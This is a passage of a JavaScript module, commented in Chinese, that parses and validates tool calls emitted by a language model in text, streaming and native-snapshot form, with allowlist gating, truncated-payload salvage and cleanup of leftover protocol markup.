    const nameHint = repairSalvage ? extractTriggerNameHint(trigger, tail) : null;
    if (!object) {
      // 定罪之前的最后一搏（事故 3：引号奇偶被打破，负载永远配不平）。位置门与
      // 规范调用完全一致（decision A，frozen Always）：正文一旦出现过，抢救与
      // 整形调用同样被压制 —— 写坏的调用绝不能比写对的更可执行。真实事故 3 的
      // span 是回答的第一个内容，压制不丢修复。抢救成功时整段（触发器→闭标记）
      // 都被消费，不落错误、不占重试名额。
      const salvaged = repairSalvage && !emittedProse
        ? salvageTruncatedSpan(fullText.slice(payloadAt), { ...repairSalvage, nameHint })
        : null;
      if (salvaged) {
        toolCalls.push(createToolCallObject(salvaged.payload, toolCalls.length));
        position = consumeDuplicateClosers(fullText, payloadAt + salvaged.end, false).end;
        continue;
      }
      // 一个配不平的 '{' 不能吞掉它后面的一切：只登记这一段的错误，扫描继续。
      const error = { type: 'truncated_tool_call', raw: fullText.slice(afterTrigger) };
      errors.push(error);
      logToolError(error);
      // 登记被定罪的**协议**原文及其在 cleanedText 里的落点。边界收在可证明是
      // 协议的部分：有闭标记时到闭标记结束；没有闭标记时只有触发器 + 尾巴 ——
      // 配不平的负载无从与后续正文划界，宁可少剥也不吞回答（frozen Always：
      // no closer ⇒ tail is not residue）。触发器在下面按正文放行，其余由后续
      // 扫描按正文放行，两段在 cleanedText 里连续。
      const spanTail = fullText.slice(payloadAt);
      const closerMatch = spanTail.match(TOOL_CALL_CLOSE_BRACKET_SCAN_RE);
      const condemnedEnd = closerMatch
        ? payloadAt + closerMatch.index + closerMatch[0].length
        : payloadAt;
      residueSpans.push({ text: fullText.slice(triggerAt, condemnedEnd), at: cleanedText.length });
      releaseProse(trigger);
      position = afterTrigger;
      continue;
    }

    const afterFence = skipTrailingFence(fullText, object.end, tail, false).end;
    const closer = consumeTrailingCloser(fullText, afterFence, false);
    const spanEnd = Math.max(afterFence, closer.end);
    const span = fullText.slice(triggerAt, spanEnd);
    // 触发器必须是可见回答里第一个非空白内容。模型复述回来的不可信内容自己也能带触发器，
    // 这一条把它挡在外面；提示词本来就要求模型这样写。
    //
    // 不产生调用，但整段仍然**吞掉**：它是工具标记，不是回答。放回正文会让裸 XML 漏给
    // 客户端 —— 模型在 thinking 里写 `checking <tool_call>{…}</tool_call>` 正是这一种。
    if (emittedProse) {
      warnings.push({
        type: 'triggered_unrecovered',
        reason: 'not the first content of the answer',
        raw: trigger
      });
      logTriggerSuppressed(trigger, 'not the first content of the answer');
      position = spanEnd;
      continue;
    }

    const built = buildToolCallPayload(object.text, repairSalvage ? { ...repairSalvage, nameHint } : null);
    const error = built.error || gateToolName(built.payload, allowedToolNames);
    if (error) {
      errors.push(error);
      logToolError(error);
      residueSpans.push({ text: span, at: cleanedText.length });
      releaseDebris(span);
      position = spanEnd;
      continue;
    }

    toolCalls.push(createToolCallObject(built.payload, toolCalls.length));
    // 只有**被接受的**调用才吞掉后面的重复闭标记（实测泄漏 #2 的
    // `[END TOOL CALL][END TOOL CALL]`）。被拒绝/压制的片段保持旧行为 ——
    // 流式路径的 closerSwallow 也只在调用发出后才布防，两条路径必须一致。
    position = closer.end > afterFence
      ? consumeDuplicateClosers(fullText, closer.end, false).end
      : spanEnd;
  }

  releaseProse(fullText.slice(position));
  // cleanedText 收尾 trim：登记的落点随前导空白平移（span 自身以非空白开头，
  // 不可能整段落在被削掉的前导区；尾部被削的贴边 span 由 stripToolCallResidue
  // 的前缀容差处理）。孤儿闭标记在**最终交付文本**上补登记（坐标系一致）。
  const leadingTrim = cleanedText.length - cleanedText.trimStart().length;
  const trimmedCleanedText = cleanedText.trim();
  const adjustedSpans = residueSpans.map(span => ({ ...span, at: span.at - leadingTrim }));
  recordOrphanBracketClosers(trimmedCleanedText, adjustedSpans);
  return {
    cleanedText: trimmedCleanedText,
    toolCalls,
    errors,
    warnings,
    residueSpans: adjustedSpans
  };
};

/**
 * 创建增量式工具调用流解析器
 * 接收 content delta，识别 tool_call 触发器与其后窗口内的 JSON 负载，
 * 对外吐出文本增量与已完成的工具调用对象。
 * 与 parseToolCallsFromText 共用触发器、闸门、窗口和负载抽取器；缓冲各管各的。
 * @returns {{
 *   push: (chunk: string) => { textDelta: string, recoveredText: string, completedCalls: Array<Object> },
 *   flush: () => { textDelta: string, recoveredText: string, completedCalls: Array<Object> },
 *   hasPendingCall: () => boolean,
 *   hasEmittedAnyCall: () => boolean
 * }} 解析器实例
 */
const createToolCallStreamParser = (options = {}) => {
  const allowedToolNames = normalizeAllowedToolNames(options.allowedToolNames);
  // 与整段路径同一条规则：无非空白名单就无抢救（名字闸门在旧语义下放行一切）。
  const salvage = !!allowedToolNames;
  // 引号修复 / 尾巴名字抢救的上下文 —— 与整段路径同一条规则：白名单 + toolSchemas
  // 齐备才存在（fail closed）。
  const repairSalvage = allowedToolNames && options.toolSchemas
    ? { allowedToolNames, toolSchemas: options.toolSchemas }
    : null;
  const errors = [];
  const warnings = [];
  // 被定罪原文的登记簿（与整段路径同义）：`{ text, at, channel }`。textDelta 与
  // recoveredText 是两个坐标系，channel 区分；at = 对应通道登记当刻的累计游标。
  // 被拒绝的合成负载（releaseRejectedSpan）不登记 —— 可能就是回答本身。
  const residueSpans = [];
  // 通道游标：登记落点用。
  let textDeltaLength = 0;
  let recoveredLength = 0;
  const code = createCodeContextTracker();
  let pendingText = '';
  let triggerText = '';
  let afterTrigger = '';
  let inToolCall = false;
  let syntheticTrigger = false;
  // 一个带闭标记的调用刚收尾：扫描循环里继续吞掉紧随其后的重复闭标记
  // （实测泄漏 #2）。重复可能被切在 chunk 边界上，所以不能在结算点一次吞完。
  let closerSwallow = false;
  let emittedCallCount = 0;
  let emittedProse = false;

  const releaseProse = (result, text) => {
    if (!text) return;
    code.consume(text);
    textDeltaLength += text.length;
    result.textDelta += text;
    if (/\S/.test(text)) emittedProse = true;
  };

  // 被消费掉的协议残片：可见（textDelta），但不算“正文已经开始”、不喂围栏追踪器
  // —— 与整段路径的 releaseDebris 同一条先例。
  const releaseDebris = (result, text) => {
    if (!text) return;
    textDeltaLength += text.length;
    result.textDelta += text;
  };

  // 被闸门拒绝的合成负载：可见、置位 emittedProse、不喂围栏追踪器 ——
  // 三个取舍的理由见整段路径的同名函数。
  const releaseRejectedSpan = (result, text) => {
    if (!text) return;
    textDeltaLength += text.length;
    result.textDelta += text;
    if (/\S/.test(text)) emittedProse = true;
  };

  /**
   * 在等待触发器出现时，安全地输出已确定不是触发器前缀的部分
   * @param {string} text - 当前累积的文本
   * @returns {{ safe: string, remainder: string }} 切分结果
   */
  const splitSafeText = (text) => {
    // 触发器可能被切在两个 chunk 中间。宽松匹配无法像字面量那样逐前缀试探，改为按上界暂存：
    // 从最后一个 '<' 或 '['（两种触发器的头）起若不超过一个触发器的长度，就留到下一段再判断。
    // 正文里孤立的头字符最多延迟 TOOL_CALL_TRIGGER_MAX 个字符，flush() 兜底放出。
    const lastOpen = Math.max(text.lastIndexOf('<'), text.lastIndexOf('['));
    if (lastOpen !== -1 && text.length - lastOpen <= TOOL_CALL_TRIGGER_MAX) {
      return { safe: text.slice(0, lastOpen), remainder: text.slice(lastOpen) };
    }
    return { safe: text, remainder: '' };
  };

  /**
   * 结算一个已经触发的片段。
   *
   * 解析失败时把整段原文（含触发器）还给调用方 —— 但放在 recoveredText 里，不是
   * textDelta。调用方用“是否已经写过正文”来决定能不能重试；抢救回来的文字是
   * “这一轮失败了”的证据，不是模型给出的回答，一旦混进 textDelta，恰恰最该重试的
   * 那一轮（残缺 / 工具名无效）就再也重试不了。
   *
   * 触发了却根本没有负载是另一回事：那多半是模型在**谈论**这个标签，不是在调用。
   * 那段文字按正文放行（textDelta），只登记一条 warning —— 它不进 getErrors()，
   * 因为 OpenAI 路径上任何 parse error 且无调用就直接 invalid_tool_call，
   * 把今天的静默泄漏升级成硬报错。重试环路的处置留给后续，本次只“记录并放行”。
   *
   * @returns {string|null} 还需要继续按正文处理的剩余文本；null 表示要等更多输入
   */
  const resolveTriggered = (result, flushing) => {
    const finish = (leftover) => {
      triggerText = '';
      afterTrigger = '';
      inToolCall = false;
      syntheticTrigger = false;
      return leftover;
    };

    // 合成开端：afterTrigger 从 '{' 开始（drain 里按构造保证）。闸门与整段路径的
    // resolveSyntheticAt 逐字对齐（parity 由测试钉住）；任何拒绝都按**可见文本**
    // 放行（textDelta），绝不进 recoveredText / errors —— 理由见整段路径同名函数。
    if (syntheticTrigger) {
      const object = extractBalancedObject(afterTrigger, 0);
      if (!object) {
        if (!flushing && afterTrigger.length <= TOOL_CALL_SPAN_MAX) return null;
        // 配不平的候选是被消费的协议残片：按 debris 放行到下一个正则触发器为止，
        // 从那里恢复正常解析（整段路径同一条规则）—— 后面写对了的调用不能陪葬。
        warnings.push({ type: 'synthetic_rejected', reason: 'unbalanced payload', raw: '' });
        logSyntheticRejected('unbalanced payload');
        const next = afterTrigger.match(TOOL_CALL_TRIGGER_RE);
        if (next) {
          residueSpans.push({ text: afterTrigger.slice(0, next.index), at: textDeltaLength, channel: 'text' });
          releaseDebris(result, afterTrigger.slice(0, next.index));
          return finish(afterTrigger.slice(next.index));
        }
        if (!flushing) {
          // 超过缓冲上界但流还活着：留住尾部一个触发器长度（可能正断在半个触发器
          // 上），其余按残片放行。每轮至少剥掉 cap - TRIGGER_MAX 字符，不会死循环。
          const keep = Math.min(TOOL_CALL_TRIGGER_MAX, afterTrigger.length);
          residueSpans.push({ text: afterTrigger.slice(0, afterTrigger.length - keep), at: textDeltaLength, channel: 'text' });
          releaseDebris(result, afterTrigger.slice(0, afterTrigger.length - keep));
          return finish(afterTrigger.slice(afterTrigger.length - keep));
        }
        residueSpans.push({ text: afterTrigger, at: textDeltaLength, channel: 'text' });
        releaseDebris(result, afterTrigger);
        return finish('');
      }
      const closer = consumeMandatoryBracketCloser(afterTrigger, object.end, !flushing);
      if (closer.needMore) {
        // 上游可以永远只吐空白不收尾：等待闭标记的缓冲与其余路径同一个上界，
        // 超限按“闭标记缺席”落进下面的分支。
        if (afterTrigger.length <= TOOL_CALL_SPAN_MAX) return null;
      }
      if (!closer.found) {
        // 不进登记簿：被拒绝的负载可能就是回答本身（见登记簿头注释）。
        warnings.push({ type: 'synthetic_rejected', reason: 'missing closer', raw: '' });
        logSyntheticRejected('missing closer');
        releaseRejectedSpan(result, object.text);
        return finish(afterTrigger.slice(object.end));
      }
      const built = buildToolCallPayload(object.text, repairSalvage);
      const gateError = built.error || gateToolName(built.payload, allowedToolNames);
      if (gateError) {
        // 只登记错误类型，不登记 reason：invalid_json 的 reason 内嵌负载片段（见整段路径）。
        // 不进登记簿：被拒绝的负载可能就是回答本身（见登记簿头注释）。
        warnings.push({ type: 'synthetic_rejected', reason: gateError.type, raw: '' });
        logSyntheticRejected(gateError.type);
        releaseRejectedSpan(result, afterTrigger.slice(0, closer.end));
        return finish(afterTrigger.slice(closer.end));
      }
      result.completedCalls.push(createToolCallObject(built.payload, emittedCallCount));
      emittedCallCount += 1;
      closerSwallow = true;
      return finish(afterTrigger.slice(closer.end));
    }

    const suppress = (reason, log) => {
      warnings.push({ type: 'triggered_unrecovered', reason, raw: triggerText });
      log(triggerText, reason);
      releaseProse(result, triggerText);
      // 剩下的重新按正文扫描：里面可能还压着下一个触发器。
      return finish(afterTrigger);
    };

    const payloadAt = findPayloadStart(afterTrigger, 0, !flushing);
    if (payloadAt === -2) return null;
    if (payloadAt === -1) return suppress('no payload in window', logTriggeredUnrecovered);

    // tail 已经完整缓冲（在 '{' 之前），两条路径同一判断：Markdown 链接收尾不是调用。
    if (isMarkdownLinkTail(triggerText, afterTrigger.slice(0, payloadAt))) {
      return suppress('markdown link, not a call', logTriggerSuppressed);
    }

    const object = extractBalancedObject(afterTrigger, payloadAt);
    if (!object) {
      // 缓冲区有上界：一个永远配不平的 '{' 不能把整条流吃进内存。
      if (!flushing && afterTrigger.length <= TOOL_CALL_SPAN_MAX) return null;
      // 定罪之前的最后一搏（事故 3 的流式路径：flush 时引号奇偶仍是破的）。
      // 两道门（frozen Always，review loop 1）：只在流已耗尽（flushing）时抢救
      // —— 半截负载还在路上时发射 tool_use，剩余字节会继续按正文流出，绝不；
      // 位置门与规范调用一致（decision A）—— 正文出现过就压制。
      // 每段只到这里一次（finish 清掉 inToolCall），O(span)。
      const salvaged = flushing && repairSalvage && !emittedProse
        ? salvageTruncatedSpan(afterTrigger.slice(payloadAt), {
          ...repairSalvage,
          nameHint: extractTriggerNameHint(triggerText, afterTrigger.slice(0, payloadAt))
        })
        : null;
      if (salvaged) {
        result.completedCalls.push(createToolCallObject(salvaged.payload, emittedCallCount));
        emittedCallCount += 1;
        closerSwallow = true;
        return finish(afterTrigger.slice(payloadAt + salvaged.end));
      }
      const error = {
        type: 'truncated_tool_call',
        raw: afterTrigger,
        ...(afterTrigger.length > TOOL_CALL_SPAN_MAX ? { reason: 'span exceeded buffer cap' } : {})
      };
      errors.push(error);
      logToolError(error);
      // 登记边界与整段路径同一条规则：有闭标记时到闭标记结束，没有时只有触发器
      // + 尾巴（配不平的负载无从划界，宁可少剥也不吞回答）。
      const spanTail = afterTrigger.slice(payloadAt);
      const closerMatch = spanTail.match(TOOL_CALL_CLOSE_BRACKET_SCAN_RE);
      const condemnedEnd = closerMatch
        ? payloadAt + closerMatch.index + closerMatch[0].length
        : payloadAt;
      residueSpans.push({
        text: triggerText + afterTrigger.slice(0, condemnedEnd),
        at: recoveredLength,
        channel: 'recovered'
      });
      recoveredLength += triggerText.length + afterTrigger.length;
      result.recoveredText += triggerText + afterTrigger;
      return finish('');
    }

    const tail = afterTrigger.slice(0, payloadAt);
    const fence = skipTrailingFence(afterTrigger, object.end, tail, !flushing);
    if (fence.needMore) return null;
    const afterFence = fence.end;
    const closer = consumeTrailingCloser(afterTrigger, afterFence, !flushing);
    if (closer.needMore) return null;

    const spanEnd = Math.max(afterFence, closer.end);
    const span = triggerText + afterTrigger.slice(0, spanEnd);
    const leftover = afterTrigger.slice(spanEnd);
    // 触发器必须是可见回答里第一个非空白内容 —— 见整段路径上的同一条规则。
    // 不产生调用，但整段仍然吞掉，走 recoveredText：否则模型在 thinking 里写的
    // `checking <tool_call>{…}</tool_call>` 会把裸 XML 漏进 reasoning_content。
    if (emittedProse) {
      warnings.push({
        type: 'triggered_unrecovered',
        reason: 'not the first content of the answer',
        raw: triggerText
      });
      logTriggerSuppressed(triggerText, 'not the first content of the answer');
      // 整段丢掉，两条通道都不给：recoveredReasoning 在回合被接受后会写回客户端
      // （openai-agent-runtime.js:410），放进去照样是裸 XML 泄漏。这一段按构造就是
      // 工具标记而不是回答，丢掉与旧行为一致 —— 旧代码把它当成一次调用消费后扔掉。
      return finish(leftover);
    }

    const built = buildToolCallPayload(object.text, repairSalvage
      ? { ...repairSalvage, nameHint: extractTriggerNameHint(triggerText, tail) }
      : null);
    const error = built.error || gateToolName(built.payload, allowedToolNames);
    if (error) {
      errors.push(error);
      logToolError(error);
      // 失败片段不喂给代码上下文追踪器，也不算“正文已经开始” —— 与整段路径同一条规则。
      residueSpans.push({ text: span, at: recoveredLength, channel: 'recovered' });
      recoveredLength += span.length;
      result.recoveredText += span;
      return finish(leftover);
    }

    result.completedCalls.push(createToolCallObject(built.payload, emittedCallCount));
    emittedCallCount += 1;
    // 只有带闭标记收尾的被接受调用才布防重复闭标记的吞除 —— 与整段路径一致。
    if (closer.end > afterFence) closerSwallow = true;
    return finish(leftover);
  };

  const drain = (chunk, result, flushing) => {
    let buffer = chunk;

    for (;;) {
      if (inToolCall) {
        afterTrigger += buffer;
        const leftover = resolveTriggered(result, flushing);
        if (leftover === null) return;
        buffer = leftover;
        continue;
      }

      pendingText += buffer;
      if (!pendingText) return;

      // 一个调用刚带着闭标记收尾：把紧随其后、已经能判定的重复闭标记吞掉
      // （与整段路径 consumeDuplicateClosers 同一条规则）。尾巴还是纯空白或半个
      // 闭标记前缀时扣住等下一个 chunk —— 调用早已发出，扣住的只是装饰性空白。
      if (closerSwallow) {
        const probe = pendingText.search(/\S/);
        if (probe === -1) {
          if (!flushing) return;
          closerSwallow = false;
        } else if (pendingText[probe] === '[' || pendingText[probe] === '<') {
          const dup = consumeTrailingCloser(pendingText, 0, !flushing);
          if (dup.needMore) return;
          if (dup.end > 0) {
            pendingText = pendingText.slice(dup.end);
            buffer = '';
            continue;
          }
          // 流死在半个重复闭标记上（`[END TOOL C` + EOF）：可行的字面前缀在
          // flush 时吞掉 —— 它是协议残片，不是回答；交付出去就是泄漏。
          if (flushing && isDanglingCloserPrefix(pendingText.slice(probe))) {
            pendingText = '';
            closerSwallow = false;
            return;
          }
          closerSwallow = false;
        } else {
          closerSwallow = false;
        }
      }

      // 可能的合成开端还没揭晓：回答顶端（或上一个调用之后）只有空白 + 一个还没
      // 配平的 '{'。这一步必须在识别器**之前**：缓冲区更靠后可能已经躺着一个配好的
      // 正则触发器，若让它先行，流式就在候选判定完成前抢跑 —— 整段路径按位置从左
      // 到右结算，两条路径会对同一文本给出不同结果。扣留判定有界：所有真实泄漏都
      // 以 name 键开头，扣满 LEAKED_PAYLOAD_NAME_WINDOW 个字符还没见到 "name" 就是
      // 普通 JSON 答案在流式输出，立刻放行恢复增量交付；已配平的对象由识别器当场
      // 判定（谓词只看对象内部）；硬上界仍是 TOOL_CALL_SPAN_MAX；flush 不扣留。
      if (!flushing && salvage && !emittedProse && !code.inCode() &&
          !isLeakedToolPayloadShape(pendingText)) {
        const braceAt = pendingText.search(/\S/);
        if (braceAt !== -1 && pendingText[braceAt] === '{' &&
            pendingText.length <= TOOL_CALL_SPAN_MAX &&
            !extractBalancedObject(pendingText, braceAt)) {
          const held = pendingText.slice(braceAt);
          if (held.length < LEAKED_PAYLOAD_NAME_WINDOW ||
              LEAKED_PAYLOAD_NAME_RE.test(held.slice(0, LEAKED_PAYLOAD_NAME_WINDOW))) {
            return;
          }
        }
      }

      // 代码上下文并进位置门（与整段路径同一条规则）：围栏/行内代码里的裸负载
      // 永远是文档。合成开端本来就要求此前只有空白，而任何反引号都已把
      // emittedProse 置位 —— 这里传 inCode() 是为了让规则显式，而不是依赖巧合。
      const opening = matchToolCallOpening(pendingText, {
        emittedProse: emittedProse || code.inCode(),
        canSalvage: salvage
      });
      if (opening) {
        const before = pendingText.slice(0, opening.index);
        releaseProse(result, before);
        const tail = pendingText.slice(opening.index + opening.text.length);
        pendingText = '';
        if (!opening.synthetic && code.inCode()) {
          warnings.push({ type: 'triggered_unrecovered', reason: 'inside code context', raw: opening.text });
          logTriggerSuppressed(opening.text, 'inside code context');
          releaseProse(result, opening.text);
        } else {
          triggerText = opening.text;
          syntheticTrigger = opening.synthetic;
          afterTrigger = '';
          inToolCall = true;
        }
        buffer = tail;
        continue;
      }

      if (flushing) {
        releaseProse(result, pendingText);
        pendingText = '';
        return;
      }

      const { safe, remainder } = splitSafeText(pendingText);
      releaseProse(result, safe);
      pendingText = remainder;
      return;
    }
  };

  const push = (chunk) => {
    const result = { textDelta: '', recoveredText: '', completedCalls: [] };
    if (typeof chunk !== 'string' || chunk.length === 0) return result;
    drain(chunk, result, false);
    return result;
  };

  const flush = () => {
    const result = { textDelta: '', recoveredText: '', completedCalls: [] };
    drain('', result, true);
    return result;
  };

  return {
    push,
    flush,
    hasPendingCall: () => inToolCall,
    hasEmittedAnyCall: () => emittedCallCount > 0,
    hasParseError: () => errors.length > 0,
    getErrors: () => [...errors],
    // 触发但无负载：单独一条通道，刻意不参与 hasParseError()。合成开端的拒绝
    // （synthetic_rejected）不算在内 —— 那些回合根本没有触发器，语义不能被翻转。
    hasTriggeredWithoutCall: () => warnings.some(w => w.type === 'triggered_unrecovered'),
    getWarnings: () => [...warnings],
    // 被定罪原文的登记簿：交付层剥残渣的唯一数据源（见 stripToolCallResidue）。
    getResidueSpans: () => residueSpans.map(span => ({ ...span }))
  };
};

const isCompleteJson = (text) => {
  try {
    JSON.parse(text);
    return true;
  } catch (_) {
    return false;
  }
};

/**
 * 累积原生工具调用。两种喂入模式，各自独立：
 *
 * 1. `push(deltas)` —— OpenAI 形状的 `delta.tool_calls`：按 index 键控，arguments 是**增量**，
 *    逐段拼接。语义原样保留（tests/tool-prompt.test.js:91-102）。
 * 2. `pushNativeSnapshot({ name, arguments, phase, functionId })` —— Qwen 网页端的
 *    `delta.function_call`：arguments 是**累积快照**（每帧带到目前为止的全文，最终快照
 *    发两遍，抓包 2026-09-01），因此是**替换**而非拼接；调用之间没有 index，靠帧的形状
 *    划界。并行调用串行到达（先 9 帧 SendMessage，再 10 帧 Bash）。
 *
 * 划界谓词（默认**合并** —— 误分裂 = 副作用执行两次，不可恢复；误合并 = JSON 不合法 →
 * 重试，可恢复）。新调用当且仅当：
 *   S1 双方都带 functionId 且不同；
 *   S2 入帧名字与打开中的调用不同（无名入帧不算不同）；
 *   S3 打开中的快照已是完整 JSON，且入帧 ≠ 它、也不以它为前缀；
 *   S4 入帧 arguments 为 '' 而打开中的非空；
 *   S5 当前没有打开中的调用（前一个已被边界关闭）。
 * 但 S5 下若入帧与本轮**已关闭**的某个调用 name+arguments 逐字节相同 → 重复帧，丢弃
 * （最终快照的副本跨过 result 帧到达时就是这个样子）。合并时保留最长的连贯快照：入帧
 * 更短而打开中的还不是完整 JSON → 保留旧的，记 snapshot_regression。
 *
 * 结构分类（全部消费者共用）：无 functionId 且 phase ∈ ANSWER_PHASES → **客户端候选**；
 * 否则是平台自有调用（code_interpreter / web_search 之类）→ 关闭时记 unknown_tool，
 * 保持今天"平台调用 → tool_error 重试"的语义，绝不发射。名字本身不是判据：客户端可以
 * 声明一个恰好叫 web_search 的工具。
 *
 * 关闭：closeByName(name) —— 带名字的 role:function 结果帧；closeOpen(reason) ——
 * 另一个调用开始 / 正文恢复 / 回合结束（reason 'round_end' 让不可解析的快照记
 * truncated_native_call 而非 invalid_arguments）。关闭即判定，错误每个调用只记一次：
 * missing_tool_name / unknown_tool（平台自有或不在白名单；白名单为空 fail closed）/
 * invalid_arguments（JSON 不合法或不是普通对象）/ truncated_native_call /
 * schema_mismatch（有 schema 且缺 required 键；多出的键只告警不拦 —— 与抢救闸门
 * gateSalvagedPayload 刻意不同，那道闸门对重塑文本 fail closed，这条通道的负载是模型
 * 原样写的）。
 *
 * 取出：takeCompleted() 只排出已关闭、过闸、尚未排出的客户端调用（id 为新 UUID，绝不回显
 * functionId）；finalize() 供旧消费者：先按 round_end 关闭打开中的，再一次性排出全部
 * 未排出的（两种模式），单发 —— 再次调用返回 []，不重记错误。
 * 统计：batchState() → { opened, closedByResult, gated }（只数客户端调用；平台调用两侧都
 * 不计），hasOpenClientCalls()。早停条件 = opened > 0 ∧ opened === closedByResult ∧ gated ≥ 1，
 * 由调用方在正文恢复帧上判定。
 *
 * @param {{ allowedToolNames?: Iterable<string>|Set<string>, toolSchemas?: Object<string, Object> }} [options]
 */
const createNativeToolCallAccumulator = (options = {}) => {
  const allowedToolNames = normalizeAllowedToolNames(options.allowedToolNames);
  const toolSchemas = options.toolSchemas && typeof options.toolSchemas === 'object' ? options.toolSchemas : null;
  const calls = new Map();
  const errors = [];
  const nativeCalls = [];
  let openCall = null;
  let emittedCount = 0;
  let finalized = false;

  const isClientCall = (call) => !call.functionId && ANSWER_PHASES.has(call.phase);

  const buildEmitted = (name, args) => ({
    index: emittedCount++,
    id: `call_${generateUUID().replace(/-/g, '').slice(0, 24)}`,
    type: 'function',
    function: { name, arguments: args }
  });

  /** 关闭即判定：过闸的标 emittable，其余记一次错误。 */
  const judgeNativeCall = (call) => {
    if (!call.name) {
      errors.push({ type: 'missing_tool_name', index: nativeCalls.indexOf(call) });
      return;
    }
    if (!isClientCall(call) || !allowedToolNames || !allowedToolNames.has(call.name)) {
      errors.push({ type: 'unknown_tool', name: call.name });
      return;
    }
    let parsed;
    try {
      parsed = JSON.parse(call.arguments);
    } catch (_) {
      errors.push({
        type: call.closeReason === 'round_end' ? 'truncated_native_call' : 'invalid_arguments',
        name: call.name
      });
      return;
    }
    if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) {
      errors.push({ type: 'invalid_arguments', name: call.name });
      return;
    }
    if (toolSchemas && Object.prototype.hasOwnProperty.call(toolSchemas, call.name)) {
      const schema = toolSchemas[call.name];
      const required = Array.isArray(schema?.required) ? schema.required : [];
      const missing = required.filter(key => !Object.prototype.hasOwnProperty.call(parsed, key));
      if (missing.length) {
        errors.push({ type: 'schema_mismatch', name: call.name, missing });
        return;
      }
      const properties = schema?.properties;
      if (properties && typeof properties === 'object') {
        const extra = Object.keys(parsed).filter(key => !Object.prototype.hasOwnProperty.call(properties, key));
        if (extra.length) {
          warnTool(`原生工具调用 ${call.name} 带有 schema 未声明的键（${extra.join(', ')}），照常发射`);
        }
      }
    }
    call.emittable = true;
  };

  const closeCall = (call, reason) => {
    call.open = false;
    call.closeReason = reason;
    if (openCall === call) openCall = null;
    judgeNativeCall(call);
  };

  const pushNativeSnapshot = (frame) => {
    if (!frame || typeof frame !== 'object') return;
    const name = typeof frame.name === 'string' ? frame.name : '';
    const args = typeof frame.arguments === 'string' ? frame.arguments : '';
    const phase = typeof frame.phase === 'string' ? frame.phase : null;
    const functionId = typeof frame.functionId === 'string' && frame.functionId ? frame.functionId : null;

    let splits = false;
    if (openCall) {
      splits = !!(
        (functionId && openCall.functionId && functionId !== openCall.functionId) ||
        (name && openCall.name && name !== openCall.name) ||
        (isCompleteJson(openCall.arguments) && args !== openCall.arguments && !args.startsWith(openCall.arguments)) ||
        (args === '' && openCall.arguments !== '')
      );
    }

    if (!openCall || splits) {
      // 本轮已关闭调用的逐字节副本：重复帧，丢弃，不开新的，也不关旧的。空快照不算副本
      // （每个调用都以 '' 开头，它不是重复的证据）。
      if (args !== '' && nativeCalls.some(call => !call.open && call.name === name && call.arguments === args)) return;
      if (openCall) closeCall(openCall, 'split');
      openCall = {
        name, arguments: args, phase, functionId,
        open: true, closeReason: null, resultSeen: false, emittable: false, emitted: false
      };
      nativeCalls.push(openCall);
      return;
    }

    if (name && !openCall.name) openCall.name = name;
    if (phase) openCall.phase = phase;
    if (functionId && !openCall.functionId) openCall.functionId = functionId;
    if (args.length < openCall.arguments.length && !isCompleteJson(openCall.arguments)) {
      warnTool(`原生工具调用快照回退（snapshot_regression）：${openCall.name || '<unnamed>'} 收到更短且未配平的快照，保留较长的那份`);
      return;
    }
    openCall.arguments = args;
  };

  // 结果帧按调用顺序到达，且可能晚于分裂关闭（SendMessage 先被 Bash 的开始关闭，它的
  // 结果帧才来）：认领最早一个尚未被结果确认的同名调用（FIFO）；它若还打开着就顺带关闭。
  const closeByName = (name) => {
    if (typeof name !== 'string' || !name) return false;
    const pending = nativeCalls.find(call => !call.resultSeen && call.name === name);
    if (!pending) return false;
    pending.resultSeen = true;
    if (pending.open) closeCall(pending, 'result');
    return true;
  };

  const closeOpen = (reason = 'boundary') => {
    if (!openCall) return false;
    closeCall(openCall, reason);
    return true;
  };

  const takeCompleted = () => {
    const out = [];
    for (const call of nativeCalls) {
      if (call.open || !call.emittable || call.emitted) continue;
      call.emitted = true;
      out.push(buildEmitted(call.name, call.arguments));
    }
    return out;
  };

  const batchState = () => {
    const client = nativeCalls.filter(isClientCall);
    return {
      opened: client.length,
      closedByResult: client.filter(call => call.resultSeen).length,
      gated: client.filter(call => call.emittable).length
    };
  };

  const push = (deltas) => {
    if (!Array.isArray(deltas)) return;
    for (const delta of deltas) {
      if (!delta || typeof delta !== 'object') continue;
      const index = Number.isInteger(delta.index) ? delta.index : calls.size;
      const current = calls.get(index) || {
        index,
        id: delta.id || null,
        type: delta.type || 'function',
        function: { name: '', arguments: '' }
      };
      if (delta.id) current.id = delta.id;
      if (delta.type) current.type = delta.type;
      if (typeof delta.function?.name === 'string' && delta.function.name) {
        const incomingName = delta.function.name;
        if (!current.function.name) {
          current.function.name = incomingName;
        } else if (incomingName === current.function.name || current.function.name.endsWith(incomingName)) {
          // 某些兼容上游会在每个 delta 重复完整 name，不能重复拼接。
        } else if (incomingName.startsWith(current.function.name)) {
          current.function.name = incomingName;
        } else {
          current.function.name += incomingName;
        }
      }
      if (typeof delta.function?.arguments === 'string') current.function.arguments += delta.function.arguments;
      calls.set(index, current);
    }
  };

  // 单发：旧消费者只调一次；再调返回 []，不重记错误（以前每次调用都重新 push 错误）。
  const finalize = () => {
    if (finalized) return [];
    finalized = true;
    const out = [];
    for (const [index, call] of [...calls.entries()].sort((a, b) => a[0] - b[0])) {
      if (!call.function.name) {
        errors.push({ type: 'missing_tool_name', index });
        continue;
      }
      if (allowedToolNames && !allowedToolNames.has(call.function.name)) {
        errors.push({ type: 'unknown_tool', name: call.function.name });
        continue;
      }
      try {
        JSON.parse(call.function.arguments || '{}');
      } catch (_) {
        errors.push({ type: 'invalid_arguments', name: call.function.name });
        continue;
      }
      const emitted = buildEmitted(call.function.name, call.function.arguments || '{}');
      if (call.id) emitted.id = call.id;
      out.push(emitted);
    }
    closeOpen('round_end');
    out.push(...takeCompleted());
    return out;
  };

  return {
    push,
    pushNativeSnapshot,
    closeByName,
    closeOpen,
    takeCompleted,
    finalize,
    batchState,
    hasOpenClientCalls: () => !!(openCall && isClientCall(openCall)),
    hasAny: () => calls.size > 0 || nativeCalls.length > 0,
    hasParseError: () => errors.length > 0,
    getErrors: () => [...errors]
  };
};

module.exports = {
  TOOL_CALL_OPEN,
  TOOL_CALL_CLOSE,
  TOOL_RESULT_OPEN,
  TOOL_RESULT_CLOSE,
  TOOL_CALL_PAYLOAD_WINDOW,
  buildToolSystemPrompt,
  foldToolMessages,
  parseToolCallsFromText,
  createToolCallStreamParser,
  createNativeToolCallAccumulator,
  looksLikeUnexecutedToolAction,
  containsOrphanProtocolResidue,
